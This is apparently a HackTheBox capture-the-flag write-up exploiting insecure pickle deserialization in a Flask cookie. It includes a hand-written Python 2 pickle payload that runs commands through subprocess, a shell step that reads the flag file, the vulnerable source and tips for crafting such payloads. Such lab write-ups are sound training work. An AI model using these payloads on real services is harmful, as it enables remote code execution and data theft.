# insecure deserialization ("anti_pickle_serum") — SOLVED (self-solved)

- Platform: HackTheBox (web). Rick and Morty themed.
- Date: 2026-09-18
- Target supplied: `http://154.57.164.82:31743` (black-box; source read afterwards
  through the bug and it confirmed the sink exactly)
- Stack: `Server: Werkzeug/1.0.1 Python/2.7.17`, Flask, Alpine container, runs as root
- Flag: redacted; verified live in the rendered page
- Cost: 2 probes, ~2 minutes.

## Chain

1. `GET /` → `302` to `/` with
   `Set-Cookie: plan_b=<base64>`. `Server: Werkzeug/1.0.1 Python/2.7.17`.
2. Base64-decoding the cookie gives a **Python 2 pickle in protocol 0**, which is
   plain ASCII and readable without any tooling:
   `(dp0\nS'serum'\np1\nccopy_reg\n_reconstructor\np2\n(c__main__\nanti_pickle_serum\np3\nc__builtin__\nobject\np4\nNtp5\nRp6\ns.`
   That is `{'serum': <__main__.anti_pickle_serum object>}`. The client is holding
   a serialized object graph, so the server must be calling `pickle.loads` on it.
3. Following the redirect confirms the value is rendered:
   `<span>Don't play around with this serum morty!! &lt;__main__.anti_pickle_serum object at 0x7f71b6b6c150&gt;</span>`
   — the page prints `str()` of whatever `serum` deserializes to. That is both the
   sink and a **direct output channel**, so nothing blind is needed.
4. Craft a protocol-0 pickle by hand whose `serum` value is a `REDUCE` of
   `subprocess.check_output`. Harmless marker first:

   ```
   (dp0
   S'serum'
   p1
   csubprocess
   check_output
   p2
   ((lp3
   S'/bin/echo'
   aS'PROBE123'
   atp4
   Rp5
   s.
   ```

   base64 that into `plan_b` → the page renders
   `Don't play around with this serum morty!! PROBE123`. Command execution
   confirmed with a marker that changes nothing.
5. Swap the argv for `['/bin/sh','-c','<cmd>']` and read the filesystem:
   `/app` holds `app.py`, `static`, `templates` and **`flag_wIp1b`**.
   `cat /app/flag_wIp1b` returns the flag in the same span.

## Source, read afterwards through the bug

`/app/app.py` is 23 lines and confirms the read exactly:

```python
@app.before_request
def set_cookie():
    if 'plan_b' not in request.cookies:
        resp = make_response(redirect(request.path))
        cookie = {'serum': anti_pickle_serum()}
        resp.set_cookie('plan_b', base64.b64encode(pickle.dumps(cookie)))
        return resp

@app.route('/')
def index():
    cookie = pickle.loads(base64.b64decode(request.cookies.get('plan_b')))
    return render_template('index.html', serum=cookie.get('serum', ''))
```

No signature, no MAC, no allow-list — `pickle.loads` straight onto a client
cookie. The `anti_pickle_serum` class is decorative; it is an empty `object`
subclass that exists only to make the default cookie look meaningful.

## Reusable lessons

- **A protocol-0 pickle is readable ASCII.** `ccopy_reg\n_reconstructor` and a
  trailing `R...s.` in a base64 cookie identify the format on sight; no decoder
  and no guessing is needed to know the server calls `pickle.loads`.
- **Hand-write the opcodes rather than generating them from Python 3.** The
  target is Python 2, and a Python 3 `pickle.dumps` emits `V` unicode opcodes and
  Python 3 module paths. The ten opcodes needed here — `(dp0`, `S`, `p`, `c`,
  `(l`, `a`, `t`, `R`, `s`, `.` — are easy to write directly and are exactly
  portable.
- **Check whether the deserialized value is rendered before building a blind
  channel.** Here `str()` of the object goes straight into the template, so
  `check_output` returns command output into the page. That makes the whole
  chain two requests with no callback, no DNS and no timing.
- **Confirm code execution with a marker, not with the objective.** `/bin/echo`
  proves the primitive and mutates nothing; only then is it worth spending a
  request on the flag.
